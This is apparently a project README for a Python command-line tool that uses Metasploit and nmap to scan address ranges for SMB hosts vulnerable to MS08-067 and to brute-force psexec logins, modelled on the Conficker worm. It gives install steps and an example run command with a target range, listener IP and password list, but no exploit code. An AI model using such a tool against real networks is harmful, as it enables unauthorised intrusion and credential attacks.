# smb-explot (conficker worm)
A command line tool to automate scanning for vulnerable smb hosts and conficker exploits using metasploit and python.
It used two attack vector. ms08_067_netapi and remote process execution brute force (psexec).
completely automated the process of using the two attack vectors on a group of vulnerable machines.

## Getting Started

Download the smb-exploit.py file 
Run the python script with the appropriate arguments.
The script must be run on a command and control machine.

### Prerequisites

* Must have metasploit installed in the atacker's machine.
* Must have nmap installed in the attacker's machine.
* A password list for bruteforcing


### Installing in macos

metasploit
```
$ git clone https://github.com/rapid7/metasploit-framework.git
$ cd metasploit-framework
$ ./msfconsole
```
Add the exeutabele to the path variable to use it directly.

homebrew
```
$ /usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"

```


nmap
```
$ brew install nmap
```


## Deployment

Run the scripy and specify the target host ip address list, listening host ip, password list
``` 
$ python smb-exploit.py -H 192.168.16.10-100 -l 192.168.16.2 -F passwords.txt
          
```
## Built With

* [nmap](https://pypi.org/project/python-nmap/) - nmap module for python
* [Metasploit](https://www.metasploit.com/) - Penetration testing framework
* [optparse](https://rometools.github.io/rome/) - Used to make a command like tool


## Acknowledgments

* inspired by Violent_python a cook book for hackers

## Disclaimer 

This is only for educational purposes and not intended to harm anyone.

